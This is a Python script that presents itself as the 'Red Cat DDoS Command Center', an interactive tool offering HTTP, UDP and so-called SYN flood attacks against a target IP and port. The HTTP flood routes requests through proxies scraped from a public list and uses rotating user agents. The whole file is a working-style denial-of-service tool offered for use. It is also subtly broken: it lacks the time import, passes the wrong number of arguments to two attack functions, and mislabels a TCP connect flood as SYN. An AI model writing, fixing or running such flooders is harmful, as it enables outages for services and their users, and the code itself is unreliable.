import os
import sys
import socket
import threading
import random
import requests
from fake_useragent import UserAgent
from bs4 import BeautifulSoup

# 🔥 Red Cat Proxy Fetcher 🔥
def get_proxies():
    url = "https://www.sslproxies.org/"
    headers = {"User-Agent": UserAgent().random}
    response = requests.get(url, headers=headers)
    soup = BeautifulSoup(response.text, "html.parser")
    proxies = []
    
    for row in soup.find("table", class_="table").find_all("tr")[1:]:
        tds = row.find_all("td")
        if tds:
            proxy = f"{tds[0].text}:{tds[1].text}"
            proxies.append(proxy)
    
    return proxies if proxies else None

# 🔥 Red Cat HTTP Flood 🔥
def http_flood(target_ip, target_port, duration, proxy_list):
    timeout = time.time() + duration
    print(f"🔥 Launching HTTP Flood on {target_ip}:{target_port} for {duration} seconds...")

    while time.time() < timeout:
        try:
            proxy = random.choice(proxy_list) if proxy_list else None
            headers = {
                "User-Agent": UserAgent().random,
                "Referer": f"http://{target_ip}/",
                "Accept-Encoding": "gzip, deflate"
            }
            proxies = {"http": f"http://{proxy}", "https": f"https://{proxy}"} if proxy else None
            requests.get(f"http://{target_ip}:{target_port}", headers=headers, proxies=proxies, timeout=3)
        except:
            pass
    print("✅ HTTP Flood Completed.")

# 🔥 Red Cat UDP Flood 🔥
def udp_flood(target_ip, target_port, duration):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1024)

    print(f"🔥 Launching UDP Flood on {target_ip}:{target_port} for {duration} seconds...")
    while time.time() < timeout:
        sock.sendto(payload, (target_ip, target_port))
    print("✅ UDP Flood Completed.")

# 🔥 Red Cat SYN Flood 🔥
def syn_flood(target_ip, target_port, duration):
    timeout = time.time() + duration
    print(f"🔥 Launching SYN Flood on {target_ip}:{target_port} for {duration} seconds...")
    
    while time.time() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.send(random._urandom(1024))
            sock.close()
        except:
            pass
    print("✅ SYN Flood Completed.")

# 🔥 Red Cat Command Lobby 🔥
def red_cat_lobby():
    proxies = get_proxies()
    print("🐱 🔥 WELCOME TO RED CAT DDoS COMMAND CENTER 🔥 🐱")
    print("😼 'Red Cat sees all. Red Cat destroys all.' 😼")

    while True:
        print("\n🔥 Select an Attack Mode 🔥")
        print("[1] HTTP Flood (with proxy)")
        print("[2] UDP Flood")
        print("[3] SYN Flood")
        print("[4] Exit")
        choice = input("⚔️ Select Attack: ")

        if choice in ["1", "2", "3"]:
            target_ip = input("🎯 Target IP: ")
            target_port = int(input("🎯 Target Port: "))
            duration = int(input("⏳ Attack Duration (seconds): "))
            threads = int(input("🚀 Number of Threads: "))

            attack_func = {
                "1": http_flood,
                "2": udp_flood,
                "3": syn_flood
            }[choice]

            for _ in range(threads):
                thread = threading.Thread(target=attack_func, args=(target_ip, target_port, duration, proxies if choice == "1" else None))
                thread.start()

        elif choice == "4":
            print("👋 Red Cat vanishes into the shadows...")
            break
        else:
            print("❌ Invalid choice. Try again.")

# Execute Red Cat Command Lobby
if __name__ == "__main__":
    red_cat_lobby()
